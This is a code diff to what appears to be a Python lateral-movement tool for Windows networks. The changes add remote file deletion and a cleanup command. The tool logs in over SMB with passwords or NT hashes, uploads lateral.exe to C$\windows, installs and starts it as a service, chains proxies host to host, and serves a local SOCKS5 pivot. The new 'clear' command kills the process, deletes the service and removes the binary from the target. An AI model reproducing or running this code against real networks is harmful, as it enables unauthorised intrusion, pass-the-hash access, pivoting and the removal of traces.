@@ -57,10 +57,12 @@ class msrpc:
 	def __del__(self):
 		for session in self.target.dce_session.values():
 			session["dce"].disconnect()
-	def get(self, source_path, target_path):
-		copy_from(self.target, source_path, target_path)
-	def put(self, source_path, target_path):
-		copy_to(self.target, source_path, target_path)
+	def get(self, source_path, target_path, share="c$"):
+		copy_from(self.target, source_path, target_path, share)
+	def put(self, source_path, target_path, share="c$"):
+		copy_to(self.target, source_path, target_path, share)
+	def delete(self, path, share="c$"):
+		delete(self.target, path, share)
 	def msrpc(self, host, user, passwd="", domain=".", nthash="", port=445):
 		port = proxy(self.target, Target(host, user, passwd, domain, nthash, port))
 		self.target.new(host, port)
@@ -69,6 +71,8 @@ class msrpc:
 		target.ip = host
 		target.prev = self
 		return target
+	def clear(self):
+		remove_service(self.target)
 
 
 def copy_to(target, source_path, target_path, share="c$"):
@@ -97,10 +101,19 @@ def copy_from(target, source_path, target_path, share="c$"):
 		print(str(e))
 		return False
 
-def delete():
-	pass
+def delete(target, path, share="c$"):
+	username, password, domain, nthash = target.creds
+	lmhash = "" if password else "aad3b435b51404eeaad3b435b51404ee"
+	try:
+		smb = SMBConnection(remoteName='*SMBSERVER', remoteHost=target.target_ip, sess_port=target.target_port)
+		smb.login(username, password, domain, lmhash, nthash)
+		smb.deleteFile(share, path)
+		return True
+	except Exception as e:
+		print(str(e))
+		return False
 
-def start_service(target, command):
+def start_service(target):
 	username, password, domain, nthash = target.creds
 	lmhash = "" if password else "aad3b435b51404eeaad3b435b51404ee"
 	aesKey = None
@@ -125,7 +138,7 @@ def start_service(target, command):
 	ans = scmr.hROpenSCManagerW(rpc)
 	scManagerHandle = ans['lpScHandle']
 	try:
-		scmr.hRCreateServiceW(rpc, scManagerHandle, "lateral" + '\x00', "Lateral" + '\x00', lpBinaryPathName=command + '\x00')
+		scmr.hRCreateServiceW(rpc, scManagerHandle, "lateral" + '\x00', "Lateral" + '\x00', lpBinaryPathName='lateral.exe\x00')
 	except Exception as e:
 		print(str(e))
 
@@ -159,18 +172,27 @@ def stop_service(target):
 	dce.bind(scmr.MSRPC_UUID_SCMR)
 	rpc = dce
 
-	#delete
-	print("[*] delete")
+	ans = scmr.hROpenSCManagerW(rpc)
+	scManagerHandle = ans['lpScHandle']
 	ans = scmr.hROpenServiceW(rpc, scManagerHandle, "lateral"+'\x00')
 	serviceHandle = ans['lpServiceHandle']
+	#print("[*] stopping")
+	#scmr.hRControlService(rpc, serviceHandle, scmr.SERVICE_CONTROL_STOP)
+	print("[*] deleting")
 	scmr.hRDeleteService(rpc, serviceHandle)
 	scmr.hRCloseServiceHandle(rpc, serviceHandle)
 
 def install_service(target):
 	print("[*] installing MSRPC proxy")
 	if copy_to(target, "msrpc/lateral.exe", "/windows/lateral.exe"):
-		start_service(target, "lateral.exe")
+		start_service(target)
 
+def remove_service(target):
+	print("[*] removing MSRPC proxy")
+	try:	execute("taskkill /f /im lateral.exe", target)
+	except:	pass
+	stop_service(target)
+	delete(target, "/windows/lateral.exe")
 
 class SC_RPC_HANDLE(NDRSTRUCT):
     structure =  (
@@ -402,20 +424,23 @@ def socks(port):
 	s.bind(("127.0.0.1", port))
 	s.listen(10)
 	while True:
-		c,info = s.accept()
-		#print("[socks] via %s" % chain.target)
-		req = c.recv(1024)
-		ver,nauth = unpack("cc", req[:2])
-		c.send(b"\x05\x00")
-		req = c.recv(1024)
-		ver,op,_,addr_type = unpack("cccc", req[:4])
-		if op == b"\x01" and addr_type == b"\x01":
-			addr = socket.inet_ntoa(req[4:8])
-			port = unpack('>H', req[8:10])[0]
-			print(f"[+] socks {chain.target} -> {addr}:{port}")
-			connect_id = info[1] #client rport
-			Thread(target=Connection, args=(c, chain, parse_target([addr, str(port)]), connect_id)).start()
-			c.send(b"\x05\x00\x00\x01"+req[4:8]+req[8:10])
+		try:
+			c,info = s.accept()
+			#print("[socks] via %s" % chain.target)
+			req = c.recv(1024)
+			ver,nauth = unpack("cc", req[:2])
+			c.send(b"\x05\x00")
+			req = c.recv(1024)
+			ver,op,_,addr_type = unpack("cccc", req[:4]) # socks5 only
+			if op == b"\x01" and addr_type == b"\x01":
+				addr = socket.inet_ntoa(req[4:8])
+				port = unpack('>H', req[8:10])[0]
+				print(f"[+] socks {chain.target} -> {addr}:{port}")
+				connect_id = info[1] #client rport
+				Thread(target=Connection, args=(c, chain, parse_target([addr, str(port)]), connect_id)).start()
+				c.send(b"\x05\x00\x00\x01"+req[4:8]+req[8:10])
+		except Exception as e:
+			print("[!] Socks: " + str(e))
 	s.close()
 
 def check_pipe(target):
@@ -491,8 +516,10 @@ def chain_get(the_chain, the_target):
 
 def print_help():
 	print('''shell 10.0.0.10 -user admin -pass s3cr3t [-dom corp -hash NT]   - next chain
+clear 10.0.0.10 -user admin -pass s3cr3t [-dom corp -hash NT]   - remove Lateral service
 get path/to/remote_file                                         - download file
 put path/to/local_file                                          - upload file
+del path/to/file                                                - delete file
 show                                                            - show chains stack
 back                                                            - go to previous chain
 goto 10.0.0.20                                                  - go to an arbitrary chain
@@ -513,7 +540,7 @@ def cmd_loop(line):
 	global chain
 	if not line:
 		return
-	if line.startswith("shell ") or line.startswith("proxy "):
+	if line.startswith("shell ") or line.startswith("proxy ") or line.startswith("clear "):
 		target = parse_target(line.strip().split(" ")[1:])
 		if chain:
 			port = proxy(chain, target)
@@ -521,6 +548,11 @@ def cmd_loop(line):
 		else:
 			chain = Chain(target.ip, 445)
 		if not chain.auth(target.user, target.passwd, target.domain, target.nthash):
+			chain = chain.prev
+			if chain:
+				chain.next.pop()
+		if line.startswith("clear "):
+			remove_service(chain)
 			chain = chain.prev
 			if chain:
 				chain.next.pop()
@@ -532,6 +564,10 @@ def cmd_loop(line):
 		file = line.split()[1]
 		if chain:
 			copy_to(chain, source_path=file, target_path=path.basename(file))
+	elif line.startswith("del "):
+		file = line.split()[1]
+		if chain:
+			delete(chain, path=file)
 	elif line in ("show", "bt", "stack"):
 		if chain:
 			chain_walk(chain_get_root(chain))
